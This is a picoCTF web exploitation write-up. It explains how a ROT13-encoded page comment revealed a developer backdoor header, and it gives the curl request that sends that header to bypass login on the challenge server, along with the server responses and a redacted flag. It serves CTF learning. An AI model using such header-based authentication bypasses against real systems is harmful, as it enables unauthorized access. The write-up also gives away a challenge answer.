# picoCTF - Easy - Web Exploitation

## Challenge Description
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
Additional details will be available after launching your challenge instance.

## Analysis
After inspecting the page source, I found a comment encoded using ROT13.
Decoding the string revealed:

"Use the header X-Dev-Access: yes"

This indicates a hidden developer backdoor mechanism that likely bypasses
normal authentication checks if the custom header is present.

## Vulnerability

This challenge demonstrates a common security misconfiguration:
Hardcoded developer backdoor logic relying solely on a custom HTTP header
without proper server-side validation.

## Exploitation
Used curl command:

curl -X POST http://amiable-citadel.picoctf.net:63798/login -H "Content-Type: application/json" -H "X-Dev-Access: yes" -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"anything\"}"

### Response

{"success":false,"error":"Unauthorized access."}
> Ini contoh response awal saat password salah / generic response

Setelah exploit berhasil:
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_REDACTED}"}

## Flag
picoCTF{brut4_f0rc4_REDACTED}